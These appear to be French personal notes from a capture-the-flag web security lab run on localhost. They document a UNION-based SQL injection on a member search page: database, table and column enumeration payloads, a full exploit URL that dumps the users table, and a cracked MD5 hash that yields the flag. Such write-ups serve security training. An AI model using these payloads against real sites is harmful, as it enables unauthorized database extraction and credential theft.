SQL INJECTION SUR LA PAGE SEARCH MEMBER BY ID

- Même principe que l'autre page avec la SQL INJECTION

- ok dond la ca avance:
    => j'ai donc fait id=-1 UNION SELECT 1, database() pour avoir le nom de la base de donnée
        => j'ai ca en retour: Member_Sql_Injection

- J'ai ensuite fait: UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
=> j'ai users comme table   

j'ai ensuite fait:
    UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=0x7573657273
- ca retourne: user_id,first_name,last_name,town,country,planet,Commentaire,countersign
- et apres je vais a taton a print plusieurs champs avec cette commande UNION SELECT first_name,last_name FROM users

pour afficher tous les champs je concatène:
- http://localhost:8080/index.php?page=member&id=-1%20UNION%20SELECT%201,CONCAT(user_id,0x3a,first_name,0x3a,last_name,0x3a,town,0x3a,country,0x3a,planet,0x3a,Commentaire,0x3a,countersign)%20FROM%20users&Submit=Submit# 
J'ai ca sur la dernière ligne: 
    => Surname : 5:Flag:GetThe:42:42:42:Decrypt this password -> then lower all the char. Sh256 on it and it's good !:5ff9d0165b4f92b14994e5c685cdce28
Si je décode en md5 j'ai :  FortyTwo et en sh256 ca donne : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5